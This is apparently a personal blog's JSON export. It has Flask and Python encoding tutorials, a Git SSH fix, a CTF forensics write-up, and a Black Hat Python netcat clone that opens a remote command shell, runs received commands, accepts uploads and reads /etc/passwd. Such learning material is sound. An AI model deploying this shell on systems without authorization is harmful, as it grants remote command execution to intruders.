{"meta":{"title":"R1ght0us's Blog","subtitle":"一个Hack小子的梦想","description":"贪财好色，一身正气","author":"R1ght0us","url":"http://www.r1ght0us.xyz"},"pages":[{"title":"About R1ght0us","date":"2018-08-15T07:52:10.000Z","updated":"2019-01-05T11:01:47.681Z","comments":false,"path":"about/index.html","permalink":"http://www.r1ght0us.xyz/about/index.html","excerpt":"","text":"一个末等 211的准大三学生 热爱代码，想要改变身边的一切 python脚本小子 CTF正在努力ing！ 渗透真的是很有意思的事情！ 我大博死都要吃信息安全这口饭！ Contact"},{"title":"categories","date":"2018-08-14T05:48:46.000Z","updated":"2018-08-14T14:19:11.520Z","comments":false,"path":"categories/index.html","permalink":"http://www.r1ght0us.xyz/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-08-14T05:35:13.000Z","updated":"2018-08-14T14:19:01.864Z","comments":false,"path":"tags/index.html","permalink":"http://www.r1ght0us.xyz/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"flask之模板","slug":"flask之模板","date":"2019-01-16T06:54:09.000Z","updated":"2019-01-16T07:16:04.469Z","comments":true,"path":"2019/01/16/flask之模板/","link":"","permalink":"http://www.r1ght0us.xyz/2019/01/16/flask之模板/","excerpt":"","text":"模板模板是一个包含响应文本的文件，其中包含用占位变量表示的动态部分，其具体值只在请求的上下文中才能知道。使用真实值替换变量，再返回最终得到的响应字符串，这一过程称为渲染。为了渲染模板，Flask使用了一个名为Jinja2的强大模板引擎。 Jinja2模板引擎形式最简单的Jinja2模板就是一个包含响应文本的文件。例如：1&lt;h1&gt;Hello World!&lt;/h1&gt; 或者是响应中包含变量，1&lt;h1&gt;Hello, &#123;&#123; name &#125;&#125;!&lt;/h1&gt; &lt;!-- name即为其中的变量 --&gt; 默认情况下，Flask在程序文件夹中的templates子文件夹中寻找模板。把前面定义的模板保存在templates文件夹中，并分别命名为index.html和user.html。例如：123456789101112131415from flask import Flask, render_templateapp = Flask(__name__)@app.route('/')def index(): return render_template('index.html')@app.route('/user/&lt;name&gt;')def user(name): return render_template('user.html', name=name)if __name__=='__main__': app.run() Flask提供的render_template函数把Jinja2模板引擎集成到了程序中。render_template函数的第一个参数是模板的文件名。随后的参数都是键值对，表示模板中变量对应的真实值。在这段代码中，第二个模板收到一个名为name的变量。在模板中使用的结构表示一个变量，它是一种特殊的占位符，告诉模板引擎这个位置的值从渲染模板时使用的数据中获取。Jinja2能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。 可以使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值：1Hello, &#123;&#123; name|capitalize &#125;&#125; 下表为Jinja2提供的常见过滤器过滤器名|说明-|-|safe|渲染值时不转义capitalize|把值的首字母转换成大写，其他字母转换成小写lower|把值转换成小写形式upper|把值转换成大写形式title|把值中每个单词的首字母都转换成大写trim|把值的首尾空格去掉striptags|渲染之前把值中所有的HTML标签都删掉 safe过滤器值得特别说明一下。默认情况下，出于安全考虑，Jinja2会转义所有变量。例如，如果一个变量的值为&lt;h1&gt;Hello&lt;/h1&gt;，Jinja2会将其渲染成&amp;lt;h1&amp;gt;Hello&amp;lt;/h1&amp;gt;，浏览器能显示这个h1元素，但不会进行解释。很多情况下需要显示变量中存储的HTML代码，这时就可使用safe过滤器。 千万别在不可信的值上使用safe过滤器，例如用户在表单中输入的文本。 Jinja2提供了多种控制结构，可用来改变模板的渲染流程。 - 使用条件控制语句。 12345&#123;% if user %&#125; Hello, &#123;&#123; user &#125;&#125;!&#123;% else %&#125; Hello, Stranger!&#123;% endif %&#125; - for循环，常见需求是在模板中渲染一组元素。 12345&lt;ul&gt; &#123;% for comment in comments %&#125; &lt;li&gt;&#123;&#123; comment &#125;&#125;&lt;/li&gt; &#123;% endfor %&#125;&lt;/ul&gt; Jinja2还支持宏。宏类似于Python代码中的函数。12345678&#123;% macro render_comment(comment) %&#125; &lt;li&gt;&#123;&#123; comment &#125;&#125;&lt;/li&gt;&#123;% endmacro %&#125;&lt;ul&gt; &#123;% for comment in comments %&#125; &#123;&#123; render_comment(comment) &#125;&#125; &#123;% endfor %&#125;&lt;/ul&gt; 为了重复使用宏，我们可以将其保存在单独的文件中，然后在需要使用的模板中导入：123456&#123;% import 'macros.html' as macros %&#125;&lt;ul&gt; &#123;% for comment in comments %&#125; &#123;&#123; macros.render_comment(comment) &#125;&#125; &#123;% endfor %&#125;&lt;/ul&gt; 需要在多处重复使用的模板代码片段可以写入单独的文件，再包含在所有模板中，以避免重复：1&#123;% include 'common.html' %&#125; 另一种重复使用代码的强大方式是模板继承，它类似于Python代码中的类继承。首先，创建一个名为base.html的基模板：1234567891011&lt;html&gt;&lt;head&gt;&#123;% block head %&#125;&lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125; - My Application&lt;/title&gt;&#123;% endblock %&#125;&lt;/head&gt;&lt;body&gt;&#123;% block body %&#125;&#123;% endblock %&#125;&lt;/body&gt;&lt;/html&gt; block标签定义的元素可在衍生模板中修改。在本例中，我们定义了名为head、title和body的块。注意，title包含在head中。下面这个示例是基模板的衍生模板：12345678910&#123;% extends \"base.html\" %&#125;&#123;% block title %&#125;Index&#123;% endblock %&#125;&#123;% block head %&#125;&#123;&#123; super() &#125;&#125;&lt;style&gt;&lt;/style&gt;&#123;% endblock %&#125;&#123;% block body %&#125;&lt;h1&gt;Hello, World!&lt;/h1&gt;&#123;% endblock %&#125; extends指令声明这个模板衍生自base.html。在extends指令之后，基模板中的3个块被重新定义，模板引擎会将其插入适当的位置。注意新定义的head块，在基模板中其内容不是空的，所以使用super()获取原来的内容。 自定义错误页面Flask允许程序使用基于模板的自定义错误页面。最常见的错误代码有两个： 404，客户端请求未知页面或路由时显示； 500，有未处理的异常时显示。为这两个错误代码指定自定义处理程序的方式如下所示：123456@app.errorhandler(404)def page_not_found(e): return render_template('404.html'), 404@app.errorhandler(500)def internal_server_error(e): return render_template('500.html'), 500 使用模板继承可以避免大量的体力劳动 链接与静态文件任何具有多个路由的程序都需要可以连接不同页面的链接，在模板中直接编写简单路由的URL链接不难，但对于包含可变部分的动态路由，在模板中构建正确的URL就很困难。为了避免这些问题，Flask提供了url_for()辅助函数，它可以使用程序URL映射中保存的信息生成URL。url_for()函数最简单的用法是以视图函数名（或者app.add_url_route()定义路由时使用的端点名）作为参数，返回对应的URL。例如，在当前版本的hello.py程序中调用url_for(‘index’)得到的结果是/。调用url_for(&#39;index&#39;, _external=True)返回的则是绝对地址，在这个示例中是http://localhost:5000/。使用url_for()生成动态地址时，将动态部分作为关键字参数传入。例如，url_for(‘user’, name=’john’, _external=True)的返回结果是http://localhost:5000/user/john。传入url_for()的关键字参数不仅限于动态路由中的参数。函数能将任何额外参数添加到查询字符串中。例如，`url_for(‘index’, page=2)`的返回结果是/?page=2。 Web程序不是仅由Python代码和模板组成。大多数程序还会使用静态文件，例如HTML代码中引用的图片、JavaScript源码文件和CSS。默认设置下，Flask在程序根目录中名为static的子目录中寻找静态文件。如果需要，可在static文件夹中使用子文件夹存放文件。例如：1234567&#123;% block head %&#125;&#123;&#123; super() &#125;&#125;&lt;link rel=\"shortcut icon\" href=\"&#123;&#123; url_for('static', filename = 'favicon.ico') &#125;&#125;\"type=\"image/x-icon\"&gt;&lt;link rel=\"icon\" href=\"&#123;&#123; url_for('static', filename = 'favicon.ico') &#125;&#125;\"type=\"image/x-icon\"&gt;&#123;% endblock %&#125;","categories":[{"name":"python编程","slug":"python编程","permalink":"http://www.r1ght0us.xyz/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://www.r1ght0us.xyz/tags/python/"},{"name":"flask","slug":"flask","permalink":"http://www.r1ght0us.xyz/tags/flask/"}]},{"title":"flask之程序基本架构","slug":"flask之程序基本架构","date":"2019-01-16T06:52:08.000Z","updated":"2019-01-16T07:05:30.177Z","comments":true,"path":"2019/01/16/flask之程序基本架构/","link":"","permalink":"http://www.r1ght0us.xyz/2019/01/16/flask之程序基本架构/","excerpt":"","text":"程序基本架构初始化所有Flask程序都必须创建一个程序实例。Web服务器使用一种名为Web服务器网关接口（Web Server Gateway Interface，WSGI）的协议，把接收自客户端的所有请求都转交给这个对象处理。程序实例是Flask类的对象，经常使用下述代码创建：12from flask import Flaskapp = Flask(__name__) Flask类的构造函数只有一个必须指定的参数，即程序主模块或包的名字。在大多数程序中，Python的name变量就是所需的值。name用来决定程序的根目录。 路由程序实例需要知道对每个URL请求运行哪些代码，所以保存了一个URL到Python函数的映射关系。处理URL和函数之间关系的程序称为路由。在Flask程序中定义路由的最简便方式，是使用程序实例提供的app.route修饰器，把修饰的函数注册为路由。下面的例子说明了如何使用这个修饰器声明路由：123@app.route('/')def index(): return '&lt;h1&gt;Hello World!&lt;/h1&gt;' 修饰器是Python语言的标准特性，可以使用不同的方式修改函数的行为。惯常用法是使用修饰器把函数注册为事件的处理程序。Flask还支持动态的URL，只需要在route修饰器中使用特殊的语法即可。123@app.route('/user/&lt;name&gt;')def user(name): return '&lt;h1&gt;Hello, %s!&lt;/h1&gt;' % name 尖括号中的内容就是动态部分，任何能匹配静态部分的URL都会映射到这个路由上。路由中的动态部分默认使用字符串，不过也可使用类型定义。例如，路由/user/&lt;int:id&gt;只会匹配动态片段id为整数的URL。Flask支持在路由中使用int、float和path类型。path类型也是字符串，但不把斜线视作分隔符，而将其当作动态片段的一部分。 启动服务器程序实例用run方法启动Flask集成的开发Web服务器：12if __name__ == '__main__': app.run(debug=True) __name__==&#39;__main__&#39;是Python的惯常用法，在这里确保直接执行这个脚本时才启动开发Web服务器。如果这个脚本由其他脚本引入，程序假定父级脚本会启动不同的服务器，因此不会执行app.run()。 debug=True用来启动调试模式 一个完整的例子12345678910from flask import Flaskapp = Flask(__name__)@app.route('/')def index(): return '&lt;h1&gt;Hello World!&lt;/h1&gt;'@app.route('/user/&lt;name&gt;')def user(name): return '&lt;h1&gt;Hello, %s!&lt;/h1&gt;' % nameif __name__ == '__main__': app.run(debug=True) 输入http://127.0.0.1:5000查看是否正确。 程序和请求上下文为了避免大量可有可无的参数把视图函数弄得一团糟，Flask使用上下文临时把某些对象变为全局可访问。有了上下文，就可以写出下面的视图函数： 12345from flask import request@app.route('/')def index(): user_agent = request.headers.get('User-Agent') return '&lt;p&gt;Your browser is %s&lt;/p&gt;' % user_agent 注意在这个视图函数中我们如何把request当作全局变量使用。事实上，request不可能是全局变量。试想，在多线程服务器中，多个线程同时处理不同客户端发送的不同请求时，每个线程看到的request对象必然不同。Falsk使用上下文让特定的变量在一个线程中全局可访问，与此同时却不会干扰其他线程。在Flask中有两种上下文：程序上下文和请求上下文。下表为两种上下文提供的变量。 变量名 上下文 说明 current_app 程序上下文 当前激活程序的程序实例 g 程序上下文 处理请求时用作临时存储的对象。每次请求都会重设这个变量 request 请求上下文 请求对象，封装了客户端发出的HTTP请求中的内容 session 请求上下文 用户会话，用于存储请求之间需要“记住”的值的词典 Flask在分发请求之前激活（或推送）程序和请求上下文，请求处理完成后再将其删除。程序上下文被推送后，就可以在线程中使用current_app和g变量。类似地，请求上下文被推送后，就可以使用request和session变量。如果使用这些变量时我们没有激活程序上下文或请求上下文，就会导致错误。 请求钩子在一个Client发出请求之前或者发出请求之后，在执行代码。请求钩子使用修饰器实现。Flask支持以下4种钩子。 before_first_request：注册一个函数，在处理第一个请求之前运行。 before_request：注册一个函数，在每次请求之前运行。 after_request：注册一个函数，如果没有未处理的异常抛出，在每次请求之后运行。 teardown_request：注册一个函数，即使有未处理的异常抛出，也在每次请求之后运行。 在请求钩子函数和视图函数之间共享数据一般使用上下文全局变量g 响应HTTP协议需要的不仅是作为请求响应的字符串。HTTP响应中一个很重要的部分是状态码，Flask默认设为200，这个代码表明请求已经被成功处理。如果视图函数返回的响应需要使用不同的状态码，那么可以把数字代码作为第二个返回值，添加到响应文本之后。例如，下述视图函数返回一个400状态码，表示请求无效：123@app.route('/')def index(): return '&lt;h1&gt;Bad Request&lt;/h1&gt;', 400 Flask视图函数还可以返回Response对象。make_response()函数可接受1个、2个或3个参数（和视图函数的返回值一样），并返回一个Response对象。下例创建了一个相应对象，然后设置了COOKIE:123456from flask import make_response@app.route('/')def index(): response = make_response('&lt;h1&gt;This document carries a cookie!&lt;/h1&gt;') response.set_cookie('answer', '42') return response 重定向经常使用302 状态码表示，指向的地址由Location首部提供。重定向响应可以使用3个值形式的返回值生成，也可在Response对象中设定。不过，由于使用频繁，Flask提供了redirect()辅助函数，用于生成这种响应：1234from flask import redirect@app.route('/')def index(): return redirect('http://www.example.com') 还有一种特殊的响应由abort函数生成，用于处理错误。在下面这个例子中，如果URL中动态参数id对应的用户不存在，就返回状态码404：1234567from flask import abort@app.route('/user/&lt;id&gt;')def get_user(id): user = load_user(id) if not user: abort(404) return '&lt;h1&gt;Hello, %s&lt;/h1&gt;' % user.name 注意，abort不会把控制权交还给调用它的函数，而是抛出异常把控制权交给Web服务器。","categories":[{"name":"python编程","slug":"python编程","permalink":"http://www.r1ght0us.xyz/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://www.r1ght0us.xyz/tags/python/"},{"name":"flask","slug":"flask","permalink":"http://www.r1ght0us.xyz/tags/flask/"}]},{"title":"Git 提交出现ssh connection time out","slug":"Git-提交出现ssh-connection-time-out","date":"2018-11-12T12:48:38.000Z","updated":"2019-01-06T09:56:22.123Z","comments":true,"path":"2018/11/12/Git-提交出现ssh-connection-time-out/","link":"","permalink":"http://www.r1ght0us.xyz/2018/11/12/Git-提交出现ssh-connection-time-out/","excerpt":"提交文章发生了奇怪的错误","text":"提交文章发生了奇怪的错误 突然的错误我今天进行提交新的博文，突然提交不上去，报错如图1prot 22: Operation timed out 初步判断为端口问题，那么除了ssh端口我们还可以用https 443端口 解决方法博主本机为win10，那么在/git/etc/ssh/ssh_config文件末尾增加 123456Host github.comUser YourEmail@xx.comHostname ssh.github.comPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsaPort 443 然后保存。然后继续在git bash中使用12git config --global user.name &quot;XXX&quot;git config --global user.email xxxx@xx.com 刷新就可以生效 linux中在~/.ssh新建config输入以下内容123456Host github.comUser YourEmail@xx.comHostname ssh.github.comPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsaPort 443 后续内容跟上面内容一样更新即可。最后运行ssh -T git@github.com，查看是否连接成功。","categories":[{"name":"hexo","slug":"hexo","permalink":"http://www.r1ght0us.xyz/categories/hexo/"}],"tags":[{"name":"hexo常见问题","slug":"hexo常见问题","permalink":"http://www.r1ght0us.xyz/tags/hexo常见问题/"},{"name":"Git","slug":"Git","permalink":"http://www.r1ght0us.xyz/tags/Git/"},{"name":"debug","slug":"debug","permalink":"http://www.r1ght0us.xyz/tags/debug/"}]},{"title":"python字符编码","slug":"python字符编码","date":"2018-10-17T14:51:19.000Z","updated":"2019-01-06T08:58:35.812Z","comments":true,"path":"2018/10/17/python字符编码/","link":"","permalink":"http://www.r1ght0us.xyz/2018/10/17/python字符编码/","excerpt":"python的编码一直是个让我头疼的问题","text":"python的编码一直是个让我头疼的问题 前言：中文编码问题一直是程序员头疼的问题，而Python2中的字符编码足矣令新手抓狂。本文将尽量用通俗的语言带大家彻底的了解字符编码以及Python2和3中的各种编码问题。 什么是字符编码。要彻底解决字符编码的问题就不能不去了解到底什么是字符编码。计算机从本质上来说只认识二进制中的0和1，可以说任何数据在计算机中实际的物理表现形式也就是0和1，如果你将硬盘拆开，你是看不到所谓的数字0和1的，你能看到的只是一块光滑闪亮的磁盘，如果你用足够大的放大镜你就能看到磁盘的表面有着无数的凹凸不平的元件，凹下去的代表0，突出的代表1，这就是计算机用来表现二进制的方式。 ASCII现在我们面临了第一个问题：如何让人类语言，比如英文被计算机理解？我们以英文为例，英文中有英文字母（大小写）、标点符号、特殊符号。如果我们将这些字母与符号给予固定的编号，然后将这些编号转变为二进制，那么计算机明显就能够正确读取这些符号，同时通过这些编号，计算机也能够将二进制转化为编号对应的字符再显示给人类去阅读。由此产生了我们最熟知的ASCII码。ASCII 码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。这样在大部分情况下，英文与二进制的转换就变得容易多了。 GB2312然而，虽然计算机是美国人发明的，但是全世界的人都在使用计算机。现在出现了另一个问题：如何让中文被计算机理解？这下麻烦了，中文不像拉丁语系是由固定的字母排列组成的。ASCII 码显然没办法解决这个问题，为了解决这个问题中国国家标准总局1980年发布《信息交换用汉字编码字符集》提出了GB2312编码，用于解决汉字处理的问题。1995年又颁布了《汉字编码扩展规范》（GBK）。GBK与GB 2312—1980国家标准所对应的内码标准兼容，同时在字汇一级支持ISO/IEC10646—1和GB 13000—1的全部中、日、韩（CJK）汉字，共计20902字。这样我们就解决了计算机处理汉字的问题了。 Unicode现在英文和中文问题被解决了，但新的问题又出现了。全球有那么多的国家不仅有英文、中文还有阿拉伯语、西班牙语、日语、韩语等等。难不成每种语言都做一种编码？基于这种情况一种新的编码诞生了：Unicode。Unicode又被称为统一码、万国码；它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。Unicode支持欧洲、非洲、中东、亚洲（包括统一标准的东亚象形汉字和韩国表音文字）。这样不管你使用的是英文或者中文，日语或者韩语，在Unicode编码中都有收录，且对应唯一的二进制编码。这样大家都开心了，只要大家都用Unicode编码，那就不存在这些转码的问题了，什么样的字符都能够解析了。 UTF-8但是，由于Unicode收录了更多的字符，可想而知它的解析效率相比ASCII码和GB2312的速度要大大降低，而且由于Unicode通过增加一个高字节对ISO Latin-1字符集进行扩展，当这些高字节位为0时，低字节就是ISO Latin-1字符。对可以用ASCII表示的字符使用Unicode并不高效，因为Unicode比ASCII占用大一倍的空间，而对ASCII来说高字节的0对他毫无用处。为了解决这个问题，就出现了一些中间格式的字符集，他们被称为通用转换格式，即UTF（Unicode Transformation Format）。而我们最常用的UTF-8就是这些转换格式中的一种。在这里我们不去研究UTF-8到底是如何提高效率的，你只需要知道他们之间的关系即可。 总结： 为了处理英文字符，产生了ASCII码。 为了处理中文字符，产生了GB2312。 为了处理各国字符，产生了Unicode。 为了提高Unicode存储和传输性能，产生了UTF-8，它是Unicode的一种实现形式。 Python2中的字符编码python2Python2中默认的字符编码是ASCII码，也就是说Python在处理数据时，只要数据没有指定它的编码类型，Python默认将其当做ASCII码来进行处理。这个问题出现的原因是：12```text# -*- encoding: utf-8 -*- 这样，Python在处理这个脚本时，会用UTF-8的编码去处理整个脚本，就能够正确的解析中文字符了。 总结： Python2中默认的字符编码是ASCII码。 Python2中字符串有str和unicode两种类型。str有各种编码的区别，unicode是没有编码的标准形式。 Python2中可以直接查看到unicode的字节串。 decode()与encode()方法前面我们说了这么多都是为了这一节做铺垫，现在我们开始来处理Python2中的字符编码问题。我们首先要学习Python为我们提供的两个转换编码的方法decode()与encode()。 decode()方法将其他编码字符转化为Unicode编码字符。encode()方法将Unicode编码字符转化为其他编码字符。 chardet模块可以检测字符串编码，没有该模块的可以用pip install chardet安装。 首先解释一下为什么name=”小明” 这里的小明是一个utf-8编码的字符。因为我使用的是win10操作系统，但是终端格式我默认设置utf-8,所以当我在终端将一个中文输入时，系统就会自动将这个中文字符以UTF-8的编码传递给Python。大多数情况下windows的系统编码默认是gb2312，那么在windows下做上图的测试“小明”这个字符就是gb2312编码。然而现在win10普遍都是ANSI字符集，产生了一个编码方式叫TIS-620 所谓乱码本质上是系统编码与所提供字符的编码不一致导致的，我们举一个例子： 小明的电脑中存了一个utf-8的字母A，存储在计算机中是1100001； 小红的电脑中也存了一个gb2312的字母A，存储在计算机中是11000010； 当小明与小红交换信息时，各自的计算机就不会把对方传递过来的A识别为字母A，可能认为这是字母B。 所以当我们需要操作系统正确的输出一个字符时，除了要知道该字符的字符编码，也要知道自己系统所使用的字符编码。如果系统使用的是UTF-8编码，处理的却是gb2312的字符就会出现所谓“乱码”。 一个Tips： decode()方法与在字符串前加u的方法实现的效果相同比如u’小明’ 总结： Python2的对于字符编码的转换要以unicode作为“中间人”进行转化。 知道自己系统的字符编码（Linux默认utf-8，Windows默认GB2312），对症下药。 所以我们再次强调：乱码本质上是系统编码与所提供字符的编码不一致导致的 在Pyhon3中字符编码有了很大改善最主要的有以下几点： Python 3的源码.py文件 的默认编码方式为UTF-8，所以在Python3中你可以不用在py脚本中写coding声明，并且系统传递给python的字符不再受系统默认编码的影响，统一为unicode编码。 将字符串和字节序列做了区别，字符串str是字符串标准形式与2.x中unicode类似，bytes类似2.x中的str有各种编码区别。bytes通过解码转化成str,str通过编码转化成bytes。 PS：有一个小问题被许多新手所困扰，我们来看一下图片: 我们看到当一个中文字符出现在一个list(或tuple、dict)中时，它并不会被显示为一个中文而是字节串。但当该字符串从list中提取出来再print时就能够正常显示为中文。字节串是所有字符在python中的“本质”形态，所以你可以简单的理解为list中呈现出的字节串是给计算机看的。","categories":[{"name":"python编程","slug":"python编程","permalink":"http://www.r1ght0us.xyz/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://www.r1ght0us.xyz/tags/python/"},{"name":"程序基础","slug":"程序基础","permalink":"http://www.r1ght0us.xyz/tags/程序基础/"}]},{"title":"python版netcat","slug":"python版netcat","date":"2018-10-01T08:25:07.000Z","updated":"2019-01-06T08:58:57.821Z","comments":true,"path":"2018/10/01/python版netcat/","link":"","permalink":"http://www.r1ght0us.xyz/2018/10/01/python版netcat/","excerpt":"《python黑帽子编程》这本书可以提升自己的写脚本的水平","text":"《python黑帽子编程》这本书可以提升自己的写脚本的水平&nbsp;&nbsp;为了增进自己的python编程水平，于是选了《python黑帽子编程》这本书，写完一个小作业感觉受益良多，懂了些服务器客户端的通信方式，希望自己能够坚持下去。 我已经将相关代码放到我的github，详情请点击链接，为了伟大的开源精神而干杯（手动doge） 具体代码，详情见注释123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226# -*- coding:UTF-8 -*-import sysimport socketimport getoptimport threadingimport subprocessimport time# 定义全局变量listen = Falsecommand = Falseexecute = \"\"target = \"\"upload_destination = \"\"port = 0def usage(): # 帮助说明 print(\"BHP Net Tool\\n\\n\") print(\"Usage: nc.py -t target_host -p port\") print( \"-l --listen \\ - listen on [host]:[port] for incoming connections\") print(\"-e --execute=file_to_run \\ -command execute the given file upon receiving a connection\") print(\"-c --command - initialize a command shell\") print( \"-u --upload=destination \\ - upon receiving connection upload \\ a file and write to [destination]\\n\\n\") print(\"Examples: \\n\") print(\"bhpnet.py -t 192.168.0.1 -p 5555 -l -c\") print(\"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\\\target.exe\") print(\"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\\\"cat /etc/passwd\\\"\") print(\"echo 'ABCDEF' | nc.py -t 192.168.11.12 -p 135\") sys.exit(0)def server_loop(): global target # 如果没有定义目标，那么我们监听所有接口 if not len(target): target = \"0.0.0.0\" server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((target, port)) server.listen(5) while True: client_socket, addr = server.accept() # 分拆一个线程处理新的客户端，client_socket返回一个socket对象（对应每个连接的对象）addr是具体的ip和端口 try: client_thread = threading.Thread( target=client_handler, args=(client_socket,)) client_thread.start() except Exception as e: print(e)def client_sender(buffer): client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket对象 try: # 连接到目标主机 client.connect((target, port)) client.settimeout(30) if len(buffer)!=0: client.send(buffer.encode()) while True: # 现在等待数据回传 recv_len = 1 response = \"\" while recv_len: data = client.recv(4096).decode(\"utf-8\") recv_len = len(data) response += data if recv_len &lt; 4096: # 一次接受4096个字节 break print(\"client: \"+response.strip(\"\\n\")) # 等待更多输入 buffer = \"server: \" buffer += input() buffer += \"\\n\" # 发送出去 client.send(buffer.encode()) except Exception as e: print(e) print(\"[*] Exception! Exiting\") # 关闭连接 client.close()def run_command(command): # 换行 command = command.rstrip() # 运行命令并将输出返回 try: output = subprocess.check_output( command, stderr=subprocess.STDOUT, shell=True, universal_newlines=True) # 命令执行模块 except: output = \"Failed to execute command.\\r\\n\" # 将输出发送 return outputdef client_handler(client_socket): global execute global command # 检测上传文件 if len(upload_destination): # 读取所有字符并写下目标 file_buffer = \"\" # 持续读取数据直到没有符合的数据 while True: data = client_socket.recv(1024).decode(\"utf-8\") if not data: break else: file_buffer += data if \"#\" in file_buffer: file_buffer = file_buffer[:-2] break # 现在我们接收这些数据并将它们写出来 try: file_descriptor = open(upload_destination, \"wb\") file_descriptor.write(file_buffer.encode()) file_descriptor.close() # 确认文件已经写出来 client_socket.send(b\"Succesfully saved file\") except: client_socket.send(b\"Failed to saved file\") client_socket.close() if len(execute): # 运行命令 output = run_command(execute) client_socket.send(output.encode()) # 如果需要一个命令行shell，那么我们进另一个循环 if command: while True: # 跳出一个窗口 client_socket.send(b\"&lt;BHP:#&gt;: \") # 现在我们接受文件直到发现换行符(enter key) cmd_buffer = \"\" while \"\\n\" not in cmd_buffer: cmd_buffer = client_socket.recv(1024).decode(\"gbk\") # 反还命令输出 response = run_command(cmd_buffer) # 返回相应数据 client_socket.send(response.encode()) # python3中必须以BYTE流进行传输def main(): global listen # 全局变量 global port global execute global command global upload_destination global target# getopt 模块，该模块是专门用来处理命令行参数的 if not(len(sys.argv[1:])): # sys.argv[0]代表脚本本身名称 usage()# 读取命令行 try: opts, args = getopt.getopt(sys.argv[1:], \"hle:t:p:cu:\", [ \"help\", \"listen\", \"execute=\", \"target=\", \"port=\", \"command=\", \"upload=\"]) except getopt.GetoptError as err: print(str(err)) usage() for o, a in opts: if o in (\"-h\", \"--help\"): usage() elif o in (\"-l\", \"--listen\"): listen = True elif o in (\"-e\", \"--execute\"): execute = a elif o in (\"-c\", \"--command\"): command = True elif o in (\"-u\", \"--upload\"): upload_destination = a elif o in (\"-t\", \"--target\"): target = a elif o in (\"-p\", \"--port\"): port = int(a) else: assert False, \"Unhandled Option\" # assert相当于断点，根据后面的表达式的布尔值进行判断，如果错误输出之后的字符串信息。 # 进行监听还是仅从标准输入发送数据？ if not listen and len(target) and (port &gt; 0): buffer = \"\" # 从命令行读取内存数据 # 这里将会堵塞，所以不在向标准输入发送数据时发送CTRL+D· buffer = input() + '\\n' # 发送数据 client_sender(buffer) # 开始监听并准备上传文件、执行命令 # 放置一个反弹SHELL # 取决于上面的命令选项 if listen: server_loop()if __name__ == '__main__': main()","categories":[{"name":"python编程","slug":"python编程","permalink":"http://www.r1ght0us.xyz/categories/python编程/"}],"tags":[{"name":"netcat","slug":"netcat","permalink":"http://www.r1ght0us.xyz/tags/netcat/"},{"name":"python3","slug":"python3","permalink":"http://www.r1ght0us.xyz/tags/python3/"}]},{"title":"新疆首届知识技能大赛相关writeup","slug":"新疆首届知识技能大赛相关writeup","date":"2018-09-16T07:56:01.000Z","updated":"2019-01-06T09:00:11.918Z","comments":true,"path":"2018/09/16/新疆首届知识技能大赛相关writeup/","link":"","permalink":"http://www.r1ght0us.xyz/2018/09/16/新疆首届知识技能大赛相关writeup/","excerpt":"一次CTF赛后总结","text":"一次CTF赛后总结总是把比赛想的太简单，原来在哪里总是藏龙卧虎，不能小瞧任何人，也别高看了自己。但是这是第一次参加不让联网的CTF比赛！ stay foolish,stay hungry 如来十三掌通过这个题目，让我联想到与佛论禅和rot13加密，那么打开题目，下载下来一个docx文档。下面加粗的文字即是打开文档的内容。 夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮 首先我们打开与佛论禅，在其加密内容前加上佛曰：。如图所下：下面是这个解出来密文，显然还有一层加密。MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9猜测base64编码，结果没有解出来。联系题目猜测为rot13加密解码出来继续base64解码，在此之后我会写相关的加密的详解。 取证内存镜像flag这道题给了hint才知道是内存取证，但是因为自己起初没在意相关工具的使用其实就是自己懒，那么这次的惨败正好弥补自己的不足。 volatility是专门进行内存取证的工具，对于windows系统比较友好，linux系统需要单独的安装相应的插件。1-f 选择所要取证的镜像文件 进行镜像识别1imageinfo 我们可以发现volatility建议我们使用WinXPSP2x86，那么继续使用查看当时的dump下来的内存中存在的进程1--profile 使用哪一种镜像进行取证 1pslist 查看当时dump下来所运行的进程 然而根据题目，我们猜测应该在是某个文件，那么扫描目录，其中为了查询相关字符，进行了管道命令以及grep进行筛选。1filescan 文件扫描 那么下面我就进行导出其相关文件。1dumpfiles 导出文件 1-Q 所要导出文件的地址 1--dump-dir 导出文件所要存在那个目录里 打开发现这个压缩包需要密码，我猜测了许多种可能，密码应该在剪切板中，于是搜索剪切板的内容1clipboard 查看剪切板的内容 于是尝试是否这个剪切板的内容就是密码，获得flag 这个是真·取证，让我感觉到这个CTF还是能够提高我在安全的其他方面的。 